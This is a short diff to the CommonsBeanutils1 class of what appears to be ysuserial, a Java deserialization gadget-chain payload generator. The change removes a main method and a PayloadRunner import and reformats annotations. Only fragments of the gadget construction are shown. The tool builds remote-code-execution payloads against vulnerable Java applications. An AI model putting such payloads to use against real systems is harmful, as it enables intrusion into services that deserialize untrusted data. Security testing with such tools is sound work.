@@ -8,12 +8,11 @@ import org.apache.commons.beanutils.BeanComparator;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
-@SuppressWarnings({ "rawtypes", "unchecked" })
+@SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
@@ -36,9 +35,5 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 		queueArray[1] = templates;
 
 		return queue;
-	}
-
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsBeanutils1.class, args);
 	}
 }
